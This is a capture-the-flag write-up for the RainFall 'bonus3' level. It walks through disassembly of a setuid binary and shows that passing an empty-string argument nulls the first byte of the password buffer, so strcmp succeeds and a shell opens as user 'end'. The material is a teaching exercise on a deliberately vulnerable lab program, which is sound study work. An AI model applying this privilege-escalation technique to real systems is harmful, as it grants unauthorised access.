This program reads the content of the .pass file and stores it in a buffer
located on the stack, of size 132 :

	0x08048502 <+14>:	mov    $0x80486f0,%edx
	0x08048507 <+19>:	mov    $0x80486f2,%eax
	0x0804850c <+24>:	mov    %edx,0x4(%esp)
	0x08048510 <+28>:	mov    %eax,(%esp)
	0x08048513 <+31>:	call   0x8048410 <fopen@plt>
	0x08048518 <+36>:	mov    %eax,0x9c(%esp)

		file = fopen("/home/user/end/.pass", "r");

   	0x0804851f <+43>:	lea    0x18(%esp),%ebx <== %ebx = buf;

0x9c - 0x18 = 0x84 = 132

This buffer is zero'd out by a call to memset :

	0x0804851f <+43>:	lea    0x18(%esp),%ebx
	0x08048523 <+47>:	mov    $0x0,%eax
	0x08048528 <+52>:	mov    $0x21,%edx
	0x0804852d <+57>:	mov    %ebx,%edi
	0x0804852f <+59>:	mov    %edx,%ecx
	0x08048531 <+61>:	rep stos %eax,%es:(%edi)

		memset(buf, 0, sizeof(buf));

A check ensures that the file was successfully opened :

	0x08048533 <+63>:	cmpl   $0x0,0x9c(%esp) if (file == NULL)
	0x0804853b <+71>:	je     0x8048543 <main+79>
	...
	0x08048543 <+79>:	mov    $0xffffffff,%eax
	0x08048548 <+84>:	jmp    0x8048615 <main+289>
	...
	0x08048615 <+289>:	lea    -0x8(%ebp),%esp
	0x08048618 <+292>:	pop    %ebx
	0x08048619 <+293>:	pop    %edi
	0x0804861a <+294>:	pop    %ebp
	0x0804861b <+295>:	ret

		return (-1);

And that 2 arguments were passed to the program :

	0x0804853d <+73>:	cmpl   $0x2,0x8(%ebp) if (ac == 2)
	0x08048541 <+77>:	je     0x804854d <main+89>

It is not possible to leak the flag by using gdb because the process launched 
by gdb is owned by user bonus3 and the target file by user end.
Thus the call to fopen will fail and it won't be possible to read the content
of the .pass file by inspecting the stack.

By further inspecting the code, we can see that there's an issue :

	0x08048579 <+133>:	mov    0xc(%ebp),%eax
	0x0804857c <+136>:	add    $0x4,%eax
	0x0804857f <+139>:	mov    (%eax),%eax
	0x08048581 <+141>:	mov    %eax,(%esp)
	0x08048584 <+144>:	call   0x8048430 <atoi@plt>
	0x08048589 <+149>:	movb   $0x0,0x18(%esp,%eax,1)

		buf[atoi(av[1])] = '\0';

This set of instructions means that it is possible to override any character
in buf by zero.
Further down the program verifies if the contents of buf and av[1] are similar :

	0x080485c7 <+211>:	mov    0xc(%ebp),%eax
	0x080485ca <+214>:	add    $0x4,%eax
	0x080485cd <+217>:	mov    (%eax),%eax
	0x080485cf <+219>:	mov    %eax,0x4(%esp)
	0x080485d3 <+223>:	lea    0x18(%esp),%eax
	0x080485d7 <+227>:	mov    %eax,(%esp)
	0x080485da <+230>:	call   0x80483b0 <strcmp@plt>
	0x080485df <+235>:	test   %eax,%eax
	0x080485e1 <+237>:	jne    0x8048601 <main+269>

		if (strcmp(buf, av[1]) == 0)

Before invoking a new shell :

	0x080485e3 <+239>:	movl   $0x0,0x8(%esp)
	0x080485eb <+247>:	movl   $0x8048707,0x4(%esp)
	0x080485f3 <+255>:	movl   $0x804870a,(%esp)
	0x080485fa <+262>:	call   0x8048420 <execl@plt>

		execl("/bin/sh", "sh", (char *)0);

Buf is supposed to hold the flag but we have no way of guessing the value,
so the only way to make sure strcmp returns 0 is by making sure it compares
empty strings.
As you may know, strcmp stops once it reaches a null character.
We can override the first character of buf directly,
but passing "0" as an argument to the program would translate to :

	./bonus3 0
	...
	strcmp("", "0");


Finally, the answer is :

bonus3@RainFall:~$ ./bonus3 ""
$ whoami
end
$
